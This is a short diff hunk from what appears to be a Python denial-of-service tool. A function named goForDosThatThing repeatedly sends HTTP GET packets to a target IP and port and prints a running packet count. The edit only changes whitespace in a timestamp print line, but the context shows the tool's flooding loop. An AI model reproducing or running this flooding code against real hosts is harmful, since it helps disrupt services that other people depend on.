@@ -71,7 +71,7 @@ def goForDosThatThing():
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                         print(Colors.BOLD + Colors.CYAN + "Sent packet:>  " + Colors.WARNING + str(Count.packetCounter) + Colors.MAGENTA + " Loading-Get :" + Colors.WHITE + str(ip))
                         Count.packetCounter = Count.packetCounter + 1
-                        print(Colors.BOLD + Colors.BOLD + "DD-mm-YY-H :> " + Colors.WARNING + time.strftime( "%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
+                        print(Colors.BOLD + Colors.BOLD + "DD-mm-YY-H :>  " + Colors.WARNING + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
                     except socket.error:
                         print(Colors.WARNING + "ERROR, please check the host!")
                     except KeyboardInterrupt:
